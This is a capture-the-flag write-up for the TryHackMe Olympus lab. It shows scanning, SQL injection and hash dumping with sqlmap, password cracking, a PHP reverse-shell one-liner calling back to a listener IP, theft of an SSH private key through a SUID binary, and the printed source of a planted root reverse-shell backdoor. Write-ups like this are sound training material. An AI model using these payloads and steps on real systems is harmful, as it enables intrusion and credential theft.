# TryHackMe Olympus Writeup

---

## Nmap Scan 

```
nmap -sCV -Pn 10.113.153.151
```

```ruby
Nmap scan report for 10.113.153.151
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b9:5f:70:a4:64:b0:fe:2e:e4:4b:14:f4:93:97:28:89 (RSA)
|   256 40:80:33:87:00:11:3a:6a:6b:e2:b1:e8:23:aa:7d:9e (ECDSA)
|_  256 ce:92:f9:3a:c3:31:97:ae:7f:91:5e:7d:82:07:d0:52 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.54 seconds

```

## Gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm
```

<img width="773" height="545" alt="image" src="https://github.com/user-attachments/assets/4b629a6f-3065-4647-8075-a623342336f6" />

## in **`/~webmaster`** found cms call **`victor cms`**

<img width="1682" height="654" alt="image" src="https://github.com/user-attachments/assets/579aa4ba-26a8-4c49-bd72-a5f2edc73f7c" />

## i search for vulns in it and found 

```
searchsploit victor cms
```

<img width="1483" height="286" alt="image" src="https://github.com/user-attachments/assets/c43e0224-e6fb-47cb-b72d-ec825bd834d2" />

## let's get file of file upload exploit and try it 

```
searchsploit -m 48490
```

<img width="1548" height="636" alt="image" src="https://github.com/user-attachments/assets/470c6d36-212c-4768-a4de-c28042894c6d" />

## in output i found  

<img width="955" height="199" alt="image" src="https://github.com/user-attachments/assets/c65302da-7d9d-48f4-9fcf-eec08b52a1fe" />

## let's try to see all users 

```
POST /~webmaster/admin/users.php?source=View_All_Users HTTP/1.1
```

> ## and we found all users even user **`test`** that we added

<img width="931" height="290" alt="image" src="https://github.com/user-attachments/assets/1af4a149-6770-43de-89d3-20eafbba120c" />

## to complete exploit 

<img width="787" height="100" alt="image" src="https://github.com/user-attachments/assets/5f6baa43-a15f-4d93-a57c-3b8188cea760" />

## but when i try to do that i get 403

<img width="1242" height="206" alt="image" src="https://github.com/user-attachments/assets/8c150969-c51a-4a3f-8653-f2f340b84265" />

--------------------------------------------------------

## i navgate the website and found login form and i try to do sqli on it and it work 

```
sqlmap -r request.txt  --tables --dump 
```

<img width="1326" height="353" alt="image" src="https://github.com/user-attachments/assets/161aaf69-2065-4423-9b5b-74f7b7864cb3" />

## if found these databases 

<img width="1200" height="161" alt="image" src="https://github.com/user-attachments/assets/20ecf4c8-ffd8-417d-919a-e7317b3d190c" />

```
databases:
- mysql
- information_schema
- performance_schema
- sys
- phpmyadmin
- olympus  
```

---

## let's find what tables names in **`olympus`** db

```
sqlmap -r request.txt --batch --tables olympus
```

<img width="899" height="374" alt="image" src="https://github.com/user-attachments/assets/fd7ef224-17e9-45b1-8a91-ee7b0e5442a7" />

```
olympus:
- categories
- chats
- comments
- flag
- posts
- users
```

## let's get usernames and passwords

```
sqlmap -r search.req -D olympus -T users -C user_email,user_name,user_password,user_role --dump
```

```
prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```

## now i will crack hashes with jhon

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1002" height="237" alt="image" src="https://github.com/user-attachments/assets/1f575228-af77-4eb4-b031-2119b3ec0f34" />

```
summertime       (prometheus)   
```

<img width="1919" height="449" alt="image" src="https://github.com/user-attachments/assets/90399b8a-bfe2-4fa4-9ae1-29c2cf456431" />

> ## i notice in emails in database new subdomain let's add it to **`/etc/hosts`**

```
chat.olympus.thm
```

```
http://chat.olympus.thm/home.php
```

## found chat and there is option to upload file so maybe we can upload reveseshell but where this files uploaded

<img width="1632" height="792" alt="image" src="https://github.com/user-attachments/assets/ead32846-ff90-4ec8-b10c-9525a103bc16" />

## gobuster found **`uploads`**

```
 gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://chat.olympus.thm/ 
```

<img width="777" height="153" alt="image" src="https://github.com/user-attachments/assets/2fc5abfb-d8e1-4afa-a0af-61bf369da100" />

> ## but it empty 

<img width="1410" height="207" alt="image" src="https://github.com/user-attachments/assets/e5794835-4487-4e42-b0a2-6ab733d0c690" />

## i found it in **`Chat`** table in database the file that was uploaded in chat appear there but it uploaded with random name 

```
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.137.69/4444 0>&1'"); ?>
```

<img width="640" height="132" alt="image" src="https://github.com/user-attachments/assets/b05fa077-0958-469f-bacc-6b34b7c06e05" />

<img width="1348" height="212" alt="image" src="https://github.com/user-attachments/assets/80fa25a3-2add-42e1-bcc0-7a01c97b723b" />

## i uploaded this and i will go to db to find name of file then call it from **`http://chat.olympus.thm/uploads/<file_name>`**

<img width="1311" height="318" alt="image" src="https://github.com/user-attachments/assets/6a8b513c-af6e-4f71-9608-bd95896233bf" />

```
http://chat.olympus.thm/uploads/ea8853e8c68badb3a3c57a3dcd2641c1.php
```

<img width="1129" height="155" alt="image" src="https://github.com/user-attachments/assets/c36bd7c4-d0a1-439c-b1d0-f59ef7fd3939" />

## now try to privlage esc to zeus

> ## search for **`suid`** files permissions 

```
find / -perm -u=s -type f 2>/dev/null
```

<img width="1154" height="324" alt="image" src="https://github.com/user-attachments/assets/3cba2a97-7ed7-40f8-8b27-91a9c69d250d" />

## found an interesting file.

```
/usr/bin/cputils
```

<img width="1221" height="485" alt="image" src="https://github.com/user-attachments/assets/34241d14-9b11-4c1e-b7f1-156477629e49" />

> # oohh so the script copy file that we want to another file what if we copy file of id_rsa of zeus user 

<img width="1321" height="567" alt="image" src="https://github.com/user-attachments/assets/9e9fee73-f71b-430d-af8f-6e0d8ddcf5ae" />

> ## boom we get it now we will connect to ssh as zeus user 

```
ssh2john id_rsa > rsa_hash.txt
john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john rsa_hash.txt --show
```

<img width="886" height="304" alt="image" src="https://github.com/user-attachments/assets/0afd05e9-9e38-4e10-abb6-d24747f27d50" />

```
snowflake
```

<img width="1194" height="209" alt="image" src="https://github.com/user-attachments/assets/ec82cd40-fec7-4845-8cab-7b375562310c" />

## now getting root 

> ## after some search and useing linpeas found this file

```
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```

```php

<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>

```

## after read code and under stand it found that it return shell as root via SUID lib 

```
$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";
```

# `run`

```
uname -a; w; /lib/defended/libc.so.99
# or Just
/lib/defended/libc.so.99
```

<img width="895" height="286" alt="image" src="https://github.com/user-attachments/assets/0beef234-2d09-4348-97d2-78478de8a1f5" />

## find bonus flag

```
cd /
grep -irl flag{
```

<img width="956" height="314" alt="image" src="https://github.com/user-attachments/assets/a93bdd69-ddc2-4e5e-a65b-f6dde21053f5" />

<img width="1004" height="297" alt="image" src="https://github.com/user-attachments/assets/5bb94c1a-a750-4fce-b5c9-e4f4af52f5f5" />

----

![MGIF (2)](https://github.com/user-attachments/assets/45372456-167e-4929-84e5-f551b7722d81)

